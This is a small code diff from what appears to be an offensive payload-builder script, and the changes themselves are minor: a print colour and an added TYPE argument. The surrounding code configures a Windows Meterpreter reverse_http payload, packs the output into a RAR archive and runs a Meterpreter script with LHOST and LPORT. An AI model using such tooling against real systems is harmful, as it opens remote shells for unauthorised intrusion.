@@ -11,7 +11,7 @@ def Construction():
     
     RC_PAYLOAD = "windows/meterpreter/reverse_http"
     
-    print(core.amcolors.PURPLE + core.amcolors.PURPLE + " Payload x86 Meterpreter Reverse HTTP" + core.amcolors.ENDC)
+    print(core.amcolors.PURPLE + core.amcolors.BOLD + " Payload x86 Meterpreter Reverse HTTP" + core.amcolors.ENDC)
 
     Gen_Payload = True
 
@@ -47,7 +47,7 @@ def Construction():
 
         gen.Compress_Rar(FILENAME)
 
-        gen.Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT)
+        gen.Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE)
 
         print(core.amcolors.GREEN + core.amcolors.BOLD + "\n [+] Complete task." + core.amcolors.ENDC)
         print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Exiting script." + core.amcolors.ENDC)
